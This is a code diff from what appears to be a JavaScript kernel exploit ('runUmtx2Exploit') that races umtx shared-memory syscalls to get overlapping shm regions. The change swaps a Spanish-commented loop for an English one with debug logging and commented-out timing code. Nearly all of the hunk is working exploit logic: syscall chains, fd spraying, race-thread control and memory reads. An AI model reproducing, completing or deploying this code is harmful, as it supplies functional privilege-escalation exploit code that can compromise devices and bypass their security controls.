@@ -802,81 +802,106 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         const mainFdBuf = alloc(0x8);
         const mainFdSizeBuf = alloc(0x8);
 
-const beforeRaceTime = performance.now();
-showTemporaryAlert("Triggering race...", LogLevel.LOG);
+        const beforeRaceTime = performance.now();
+        showTemporaryAlert("Triggering race...", LogLevel.LOG);
 
-for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
-    if (i2 % 4 === 0) {  // Reducimos la cantidad de logs para mejorar velocidad
-        log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
-    }
+        for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
+            if (i2 % 2 == 0) {
+                if (debug) {
+                    await log(`Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
+                } else {
+                    await log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
+                }
+            }
 
-    // Realiza las llamadas al sistema necesarias para la carrera de condiciones
-    chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
-    chain.write_result(mainFdBuf);
+            // const step1Start = performance.now();
+            // umtx_shm_create
+            chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
+            chain.write_result(mainFdBuf);
 
-    chain.if(mainFdBuf, chain.branch_types.GREATER, 0, false, () => {
-        chain.multiply_by_0x4000(mainFdBuf, mainFdSizeBuf);
-        chain.self_healing_syscall_2(SYS_FTRUNCATE, mainFdBuf, true, mainFdSizeBuf, true);
-        chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
-    });
+            chain.if(mainFdBuf, chain.branch_types.GREATER, 0, false, () => {
+                chain.multiply_by_0x4000(mainFdBuf, mainFdSizeBuf);
+                chain.self_healing_syscall_2(SYS_FTRUNCATE, mainFdBuf, true, mainFdSizeBuf, true);
+                chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
+            });
 
-    await chain.run(); // Ejecutamos todo en un solo `await`
+            await chain.run();
+            // const step1End = performance.now();
 
-    // Esperamos el estado adecuado de los hilos
-    await waitForRaceThreadsState(threadStatus.READY);
+            // const step2Start = performance.now();
+            await waitForRaceThreadsState(threadStatus.READY);
+            // const step2End = performance.now();
 
-    // Manipulación de memoria compartida
-    p.write8(commonThreadData.resume, 0);
-    p.write8(commonThreadData.start, 1);
+            // const step3Start = performance.now();
+            p.write8(commonThreadData.resume, 0);
+            p.write8(commonThreadData.start, 1);
+            // const step3End = performance.now();
 
-    await waitForRaceThreadsState(threadStatus.DONE);
+            // const step4Start = performance.now();
+            await waitForRaceThreadsState(threadStatus.DONE);
+            // const step4End = performance.now();
 
-    // Leemos valores de memoria optimizando accesos
-    let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);
-    let lookupFd = p.read4(lookupThreadData.fd);
+            // const step5Start = performance.now();
+            let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);
 
-    // Intentamos obtener un descriptor válido
-    const fd = await getShmFdFromSize(lookupFd);
-    if (fd) {
-        winnerFd = fd;
-        winnerLookupFd = lookupFd;
-        log(`Overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
-    }
+            let lookupFd = p.read4(lookupThreadData.fd) << 0;
+            // const step5End = performance.now();
 
-    // Evitamos cerrar descriptores en mal estado
-    if (destroyCount === 2 && lookupFd > 3) {
-        fdsToFix.push(lookupFd);
-    }
+            // const step6Start = performance.now();
+            const fd = await getShmFdFromSize(lookupFd);
+            // const step6End = performance.now();
+            if (fd) {
+                winnerFd = fd;
+                winnerLookupFd = lookupFd;
+                await log(`overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
+            }
 
-    // Cerramos descriptores sobrantes en bloque
-    for (let i3 = 0; i3 < config.num_spray_fds * 2; i3++) {
-        const addr = sprayFdsBuf.add32(0x8 * i3);
-        const fd = p.read4(addr);
-        if (fd > 0 && fd !== winnerFd) {
-            chain.add_syscall(SYS_CLOSE, fd);
+            // dont close lookup descriptor right away when it is possibly corrupted
+            if (destroyCount == 2 && lookupFd != 3 && lookupFd != -1) {
+                fdsToFix.push(lookupFd);
+            }
+
+            // const step7Start = performance.now();
+            // close other fds
+            for (let i3 = 0; i3 < (config.num_spray_fds * 2); i3++) {
+                const addr = sprayFdsBuf.add32(0x8 * i3);
+                const fd = p.read4(addr) << 0;
+                if (fd > 0 && fd != winnerFd) {
+                    chain.add_syscall(SYS_CLOSE, fd);
+                }
+                chain.push_write8(addr, 0);
+            }
+            await chain.run();
+            // const step7End = performance.now();
+
+            // we have won the race
+            if (winnerFd) {
+                break;
+            }
+
+            // const step8Start = performance.now();
+            await resetCommonData();
+            resetLookupThreadState();
+            resetDestroyerThread0State();
+            resetDestroyerThread1State();
+            // const step8End = performance.now();
+
+            if (i2 !== config.max_race_attempts - 1) {
+                p.write8(commonThreadData.resume, 1);
+            }
+
+            // alert(`Race step times:\n` +
+            //     `1: ${toHumanReadableTime(step1End - step1Start)}  | ` +
+            //     `2: ${toHumanReadableTime(step2End - step2Start)}  | ` +
+            //     `3: ${toHumanReadableTime(step3End - step3Start)}  | ` +
+            //     `4: ${toHumanReadableTime(step4End - step4Start)}  | ` +
+            //     `5: ${toHumanReadableTime(step5End - step5Start)}  | ` +
+            //     `6: ${toHumanReadableTime(step6End - step6Start)}  | ` +
+            //     `7: ${toHumanReadableTime(step7End - step7Start)}  | ` +
+            //     `8: ${toHumanReadableTime(step8End - step8Start)}`);
+
+            count++;
         }
-        chain.push_write8(addr, 0);
-    }
-
-    await chain.run(); // Solo ejecutamos `chain.run()` una vez aquí
-
-    // Si hemos ganado la carrera, terminamos
-    if (winnerFd) break;
-
-    // Reiniciamos estado para el siguiente intento
-    await resetCommonData();
-    resetLookupThreadState();
-    resetDestroyerThread0State();
-    resetDestroyerThread1State();
-
-    if (i2 !== config.max_race_attempts - 1) {
-        p.write8(commonThreadData.resume, 1);
-    }
-}
-
-
-
-
 
         if (count != config.max_race_attempts) {
             await log(`Race won after ${count} attempts`, LogLevel.INFO);
